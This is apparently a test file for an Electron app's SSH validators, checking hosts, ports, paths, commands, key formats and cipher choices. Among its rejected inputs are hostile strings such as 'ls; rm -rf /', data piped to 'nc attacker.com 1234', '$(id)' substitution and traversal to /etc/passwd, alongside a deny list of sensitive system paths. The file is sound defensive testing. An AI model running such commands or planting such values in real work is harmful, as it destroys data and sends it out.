/**
 * SSH Validators Test Suite
 * Comprehensive tests for SSH connection, command, and path validators
 */

import { describe, it, expect } from 'vitest';
import {
  validateSSHConnection,
  validateSSHHost,
  validateSSHPort,
  validateUsername,
  validatePassword,
  validatePrivateKeyPath,
  validateAuthType,
  validateConnectionTimeout,
  validateConnectionName,
  validateSSHCommand,
  validateCommandLength,
  validateCommandShellMetachars,
  validateCommandWorkingDir,
  validateCommandTimeout,
  validateSSHCommandInteractive,
  validateRemotePath,
  validateLocalPath,
  validateFilePath,
  validateDirectoryPath,
  validatePathEncoding,
  validatePathLength,
  validatePathPermissions,
  validatePrivateKeyFormat,
  validatePublicKeyFormat,
  validateKeyPassphrase,
  validateSSHVersion,
  validateCipherSuite,
  validateKEXAlgorithm,
  validateCompressionAlgorithm,
  validateKeyPermissions,
} from '../../electron/validators/ssh.js';

describe('SSH Validators', () => {
  
  describe('SSH Host Validation', () => {
    it('should validate valid IPv4 addresses', () => {
      expect(validateSSHHost('192.168.1.1')).toBe(true);
      expect(validateSSHHost('10.0.0.1')).toBe(true);
      expect(validateSSHHost('127.0.0.1')).toBe(true);
    });

    it('should reject invalid IPv4 addresses', () => {
      expect(validateSSHHost('256.1.1.1')).toBe(false); // Invalid octet > 255
    });

    it('should validate valid hostnames', () => {
      expect(validateSSHHost('example.com')).toBe(true);
      expect(validateSSHHost('server.example.com')).toBe(true);
      expect(validateSSHHost('localhost')).toBe(true);
      expect(validateSSHHost('my-server')).toBe(true);
    });

    it('should validate IPv6 addresses', () => {
      expect(validateSSHHost('::1')).toBe(true);
      expect(validateSSHHost('2001:db8::1')).toBe(true);
    });

    it('should reject hosts with special characters', () => {
      expect(validateSSHHost('server@example.com')).toBe(false);
      expect(validateSSHHost('server; rm -rf /')).toBe(false);
    });
  });

  describe('SSH Port Validation', () => {
    it('should validate valid port numbers', () => {
      expect(validateSSHPort(22)).toBe(true);
      expect(validateSSHPort(2222)).toBe(true);
      expect(validateSSHPort(1)).toBe(true);
      expect(validateSSHPort(65535)).toBe(true);
    });

    it('should reject invalid port numbers', () => {
      expect(validateSSHPort(0)).toBe(false);
      expect(validateSSHPort(65536)).toBe(false);
      expect(validateSSHPort(-1)).toBe(false);
    });
  });

  describe('Username Validation', () => {
    it('should validate valid usernames', () => {
      expect(validateUsername('ubuntu')).toBe(true);
      expect(validateUsername('user_name')).toBe(true);
      expect(validateUsername('user-name')).toBe(true);
      expect(validateUsername('user.name')).toBe(true);
    });

    it('should reject invalid usernames', () => {
      expect(validateUsername('')).toBe(false);
      expect(validateUsername('user@domain')).toBe(false);
      expect(validateUsername('user name')).toBe(false);
    });

    it('should reject usernames exceeding max length', () => {
      const longUsername = 'a'.repeat(33);
      expect(validateUsername(longUsername)).toBe(false);
    });
  });

  describe('Password Validation', () => {
    it('should validate valid passwords', () => {
      expect(validatePassword('securepass123')).toBe(true);
      expect(validatePassword('P@ssw0rd!')).toBe(true);
      expect(validatePassword(' ')).toBe(true); // Even space is valid
    });

    it('should reject empty password', () => {
      expect(validatePassword('')).toBe(false);
    });

    it('should reject very long passwords', () => {
      const longPassword = 'a'.repeat(257);
      expect(validatePassword(longPassword)).toBe(false);
    });
  });

  describe('Private Key Path Validation', () => {
    it('should validate reasonable key paths', () => {
      expect(validatePrivateKeyPath('/home/user/.ssh/id_rsa')).toBe(true);
      expect(validatePrivateKeyPath('C:\\Users\\user\\.ssh\\id_rsa')).toBe(true);
      expect(validatePrivateKeyPath('/etc/ssh/keys/server_key')).toBe(true);
    });

    it('should reject paths with traversal attempts', () => {
      expect(validatePrivateKeyPath('/home/user/../../etc/passwd')).toBe(false);
      expect(validatePrivateKeyPath('~/.ssh/id_rsa')).toBe(false);
    });

    it('should reject paths with special characters', () => {
      expect(validatePrivateKeyPath('/home/user/.ssh/id_rsa;rm')).toBe(false);
    });
  });

  describe('Auth Type Validation', () => {
    it('should validate accepted auth types', () => {
      expect(validateAuthType('password')).toBe(true);
      expect(validateAuthType('key')).toBe(true);
      expect(validateAuthType('both')).toBe(true);
    });

    it('should reject invalid auth types', () => {
      expect(validateAuthType('token')).toBe(false);
      expect(validateAuthType('invalid')).toBe(false);
    });
  });

  describe('Connection Timeout Validation', () => {
    it('should validate reasonable timeouts', () => {
      expect(validateConnectionTimeout(30)).toBe(true);
      expect(validateConnectionTimeout(60)).toBe(true);
      expect(validateConnectionTimeout(1)).toBe(true);
    });

    it('should reject unreasonable timeouts', () => {
      expect(validateConnectionTimeout(0)).toBe(false);
      expect(validateConnectionTimeout(301)).toBe(false);
      expect(validateConnectionTimeout(-1)).toBe(false);
    });
  });

  describe('Connection Name Validation', () => {
    it('should validate valid connection names', () => {
      expect(validateConnectionName('production-server')).toBe(true);
      expect(validateConnectionName('server_1')).toBe(true);
      expect(validateConnectionName('prod.db.01')).toBe(true);
    });

    it('should reject invalid connection names', () => {
      expect(validateConnectionName('')).toBe(false);
      expect(validateConnectionName('server@prod')).toBe(false);
      expect(validateConnectionName('a'.repeat(65))).toBe(false);
    });
  });

  describe('SSH Connection Validation', () => {
    it('should validate complete valid connection config', () => {
      const config = {
        host: 'example.com',
        port: 22,
        username: 'ubuntu',
        authType: 'password',
        timeout: 30,
      };
      const errors = validateSSHConnection(config);
      expect(errors.length).toBe(0);
    });

    it('should detect missing required fields', () => {
      const config = {
        host: '',
        port: 22,
      };
      const errors = validateSSHConnection(config);
      expect(errors.length).toBeGreaterThan(0);
    });

    it('should validate all fields correctly', () => {
      const config = {
        host: '192.168.1.1',
        port: 2222,
        username: 'admin',
        password: 'secret',
        authType: 'password',
        timeout: 45,
      };
      const errors = validateSSHConnection(config);
      expect(errors.length).toBe(0);
    });
  });

  describe('SSH Command Validation', () => {
    it('should accept safe commands', () => {
      expect(validateSSHCommand('ls')).toBe(true);
      expect(validateSSHCommand('ls -la')).toBe(true);
      expect(validateSSHCommand('pwd')).toBe(true);
    });

    it('should reject commands with shell metacharacters', () => {
      expect(validateSSHCommand('ls; rm -rf /')).toBe(false);
      expect(validateSSHCommand('cat file | grep pattern')).toBe(false);
      expect(validateSSHCommand('echo `whoami`')).toBe(false);
      expect(validateSSHCommand('echo $(id)')).toBe(false);
    });

    it('should reject device file redirects', () => {
      expect(validateSSHCommand('command > /dev/null')).toBe(false);
      expect(validateSSHCommand('command > /proc/cmdline')).toBe(false);
    });

    it('should reject piping to dangerous commands', () => {
      expect(validateSSHCommand('cat file | nc attacker.com 1234')).toBe(false);
      expect(validateSSHCommand('ps aux | telnet attacker.com')).toBe(false);
    });
  });

  describe('Command Length Validation', () => {
    it('should accept reasonably sized commands', () => {
      expect(validateCommandLength('ls -la /home/user')).toBe(true);
    });

    it('should reject commands exceeding max length', () => {
      const longCommand = 'a'.repeat(4097);
      expect(validateCommandLength(longCommand)).toBe(false);
    });
  });

  describe('Command Shell Metacharacters Validation', () => {
    it('should detect shell metacharacters', () => {
      expect(validateCommandShellMetachars('ls')).toBe(true);
      expect(validateCommandShellMetachars('ls; echo')).toBe(false);
      expect(validateCommandShellMetachars('cat | grep')).toBe(false);
      expect(validateCommandShellMetachars('echo `date`')).toBe(false);
    });
  });

  describe('Working Directory Validation', () => {
    it('should validate absolute paths', () => {
      expect(validateCommandWorkingDir('/home/user')).toBe(true);
      expect(validateCommandWorkingDir('/var/tmp')).toBe(true);
    });

    it('should validate relative paths', () => {
      expect(validateCommandWorkingDir('./scripts')).toBe(true);
      expect(validateCommandWorkingDir('subdir')).toBe(true);
    });

    it('should reject path traversal attempts', () => {
      expect(validateCommandWorkingDir('/home/user/../../etc')).toBe(false);
    });
  });

  describe('Command Timeout Validation', () => {
    it('should accept valid timeouts', () => {
      expect(validateCommandTimeout(30)).toBe(true);
      expect(validateCommandTimeout(3600)).toBe(true);
    });

    it('should reject invalid timeouts', () => {
      expect(validateCommandTimeout(0)).toBe(false);
      expect(validateCommandTimeout(3601)).toBe(false);
    });
  });

  describe('Interactive Command Validation', () => {
    it('should validate boolean values', () => {
      expect(validateSSHCommandInteractive(true)).toBe(true);
      expect(validateSSHCommandInteractive(false)).toBe(true);
    });

    it('should reject non-boolean values', () => {
      expect(validateSSHCommandInteractive('true')).toBe(false);
      expect(validateSSHCommandInteractive(1)).toBe(false);
    });
  });

  describe('Remote Path Validation', () => {
    it('should validate safe remote paths', () => {
      expect(validateRemotePath('/home/user/documents')).toBe(true);
      expect(validateRemotePath('/tmp/uploads')).toBe(true);
      expect(validateRemotePath('/var/www')).toBe(true);
    });

    it('should reject path traversal attempts', () => {
      expect(validateRemotePath('/home/user/../../etc/passwd')).toBe(false);
    });

    it('should reject sensitive system paths', () => {
      expect(validateRemotePath('/etc/passwd')).toBe(false);
      expect(validateRemotePath('/root/.ssh')).toBe(false);
      expect(validateRemotePath('/proc/self')).toBe(false);
      expect(validateRemotePath('/sys/kernel')).toBe(false);
      expect(validateRemotePath('/dev/sda')).toBe(false);
      expect(validateRemotePath('/boot/vmlinuz')).toBe(false);
    });

    it('should reject Windows system paths', () => {
      expect(validateRemotePath('C:\\windows\\system32')).toBe(false);
      expect(validateRemotePath('C:\\System Volume Information')).toBe(false);
    });
  });

  describe('Local Path Validation', () => {
    it('should validate safe local paths', () => {
      expect(validateLocalPath('/home/user/downloads')).toBe(true);
      expect(validateLocalPath('C:\\Users\\user\\Downloads')).toBe(true);
      expect(validateLocalPath('./files')).toBe(true);
    });

    it('should reject path traversal attempts', () => {
      expect(validateLocalPath('../../../etc/passwd')).toBe(false);
    });
  });

  describe('File Path Validation', () => {
    it('should validate safe file paths', () => {
      expect(validateFilePath('/home/user/file.txt')).toBe(true);
      expect(validateFilePath('documents/report.pdf')).toBe(true);
    });

    it('should reject null bytes', () => {
      expect(validateFilePath('/home/user\0/file.txt')).toBe(false);
    });

    it('should reject path traversal', () => {
      expect(validateFilePath('../../../etc/passwd')).toBe(false);
    });
  });

  describe('Directory Path Validation', () => {
    it('should validate safe directory paths', () => {
      expect(validateDirectoryPath('/home/user')).toBe(true);
      expect(validateDirectoryPath('/var/www/uploads')).toBe(true);
    });

    it('should reject path traversal', () => {
      expect(validateDirectoryPath('/var/../../etc')).toBe(false);
    });
  });

  describe('Path Encoding Validation', () => {
    it('should validate UTF-8 encoded paths', () => {
      expect(validatePathEncoding('/home/user/файл')).toBe(true);
      expect(validatePathEncoding('/home/user/文件')).toBe(true);
    });

    it('should handle ASCII paths', () => {
      expect(validatePathEncoding('/home/user/file.txt')).toBe(true);
    });
  });

  describe('Path Length Validation', () => {
    it('should accept reasonable path lengths', () => {
      expect(validatePathLength('/home/user/documents/file.txt')).toBe(true);
    });

    it('should reject paths exceeding max length', () => {
      const longPath = '/home/user/' + 'a'.repeat(4090);
      expect(validatePathLength(longPath)).toBe(false);
    });
  });

  describe('Path Permissions Validation', () => {
    it('should validate read permissions', () => {
      expect(validatePathPermissions('/home/user/file.txt', 'read')).toBe(true);
    });

    it('should validate write permissions', () => {
      expect(validatePathPermissions('/home/user/file.txt', 'write')).toBe(true);
    });

    it('should reject path traversal in permission checks', () => {
      expect(validatePathPermissions('../../../etc/passwd', 'read')).toBe(false);
    });
  });

  describe('Private Key Format Validation', () => {
    it('should recognize RSA private keys', () => {
      const rsaKey = `-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA1234567890
-----END RSA PRIVATE KEY-----`;
      expect(validatePrivateKeyFormat(rsaKey)).toBe(true);
    });

    it('should recognize OpenSSH private keys', () => {
      const opensshKey = `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmU=
-----END OPENSSH PRIVATE KEY-----`;
      expect(validatePrivateKeyFormat(opensshKey)).toBe(true);
    });

    it('should reject invalid key formats', () => {
      expect(validatePrivateKeyFormat('not a key')).toBe(false);
    });
  });

  describe('Public Key Format Validation', () => {
    it('should recognize SSH RSA public keys', () => {
      const rsaPublicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ...';
      expect(validatePublicKeyFormat(rsaPublicKey)).toBe(true);
    });

    it('should recognize SSH ED25519 public keys', () => {
      const ed25519PublicKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...';
      expect(validatePublicKeyFormat(ed25519PublicKey)).toBe(true);
    });

    it('should recognize ECDSA public keys', () => {
      const ecdsaPublicKey = 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAI...';
      expect(validatePublicKeyFormat(ecdsaPublicKey)).toBe(true);
    });

    it('should reject invalid public key formats', () => {
      expect(validatePublicKeyFormat('not a public key')).toBe(false);
    });
  });

  describe('Key Passphrase Validation', () => {
    it('should validate non-empty passphrases', () => {
      expect(validateKeyPassphrase('securePassphrase123')).toBe(true);
    });

    it('should reject empty passphrases', () => {
      expect(validateKeyPassphrase('')).toBe(false);
    });

    it('should validate special characters in passphrase', () => {
      expect(validateKeyPassphrase('P@ssw0rd!#$%')).toBe(true);
    });
  });

  describe('SSH Version Validation', () => {
    it('should accept SSH version 2', () => {
      expect(validateSSHVersion('2.0')).toBe(true);
      expect(validateSSHVersion('2')).toBe(true);
    });

    it('should reject SSH version 1', () => {
      expect(validateSSHVersion('1')).toBe(false);
      expect(validateSSHVersion('1.99')).toBe(false);
    });
  });

  describe('Cipher Suite Validation', () => {
    it('should accept approved ciphers', () => {
      expect(validateCipherSuite('aes128-ctr')).toBe(true);
      expect(validateCipherSuite('aes256-ctr')).toBe(true);
      expect(validateCipherSuite('aes128-gcm@openssh.com')).toBe(true);
      expect(validateCipherSuite('chacha20-poly1305@openssh.com')).toBe(true);
    });

    it('should reject unapproved ciphers', () => {
      expect(validateCipherSuite('des-cbc')).toBe(false);
      expect(validateCipherSuite('rc4')).toBe(false);
    });
  });

  describe('Key Exchange Algorithm Validation', () => {
    it('should accept approved algorithms', () => {
      expect(validateKEXAlgorithm('diffie-hellman-group14-sha256')).toBe(true);
      expect(validateKEXAlgorithm('ecdh-sha2-nistp256')).toBe(true);
      expect(validateKEXAlgorithm('curve25519-sha256')).toBe(true);
    });

    it('should reject weak algorithms', () => {
      expect(validateKEXAlgorithm('diffie-hellman-group1-sha1')).toBe(false);
    });
  });

  describe('Compression Algorithm Validation', () => {
    it('should accept safe algorithms', () => {
      expect(validateCompressionAlgorithm('none')).toBe(true);
      expect(validateCompressionAlgorithm('zlib')).toBe(true);
      expect(validateCompressionAlgorithm('zlib@openssh.com')).toBe(true);
    });

    it('should reject unsafe algorithms', () => {
      expect(validateCompressionAlgorithm('gzip')).toBe(false);
    });
  });

  describe('Key Permissions Validation', () => {
    it('should accept 600 permissions', () => {
      expect(validateKeyPermissions(0o600)).toBe(true);
      expect(validateKeyPermissions(384)).toBe(true); // Decimal for 0o600
    });

    it('should reject insecure permissions', () => {
      expect(validateKeyPermissions(0o644)).toBe(false);
      expect(validateKeyPermissions(0o755)).toBe(false);
    });
  });

  describe('Complex Integration Tests', () => {
    it('should validate complete SSH transfer operation', () => {
      // Connection
      const connConfig = {
        host: 'sftp.example.com',
        port: 22,
        username: 'ftpuser',
        authType: 'key',
        privateKey: '/home/user/.ssh/id_ed25519',
        timeout: 60,
      };
      const connErrors = validateSSHConnection(connConfig);
      expect(connErrors.length).toBe(0);

      // Remote file path
      expect(validateRemotePath('/uploads/data.zip')).toBe(true);

      // Local file path
      expect(validateLocalPath('C:\\Downloads\\data.zip')).toBe(true);
    });

    it('should validate secure command execution', () => {
      // SSH command
      expect(validateSSHCommand('tar -czf backup.tar.gz /home/data')).toBe(true);

      // Working directory
      expect(validateCommandWorkingDir('/var/backups')).toBe(true);

      // Timeout
      expect(validateCommandTimeout(600)).toBe(true);
    });

    it('should validate key management operations', () => {
      // Key path
      expect(validatePrivateKeyPath('/home/ubuntu/.ssh/id_rsa')).toBe(true);

      // Key passphrase
      expect(validateKeyPassphrase('MySecurePass123!')).toBe(true);

      // Key permissions
      expect(validateKeyPermissions(0o600)).toBe(true);
    });
  });
});
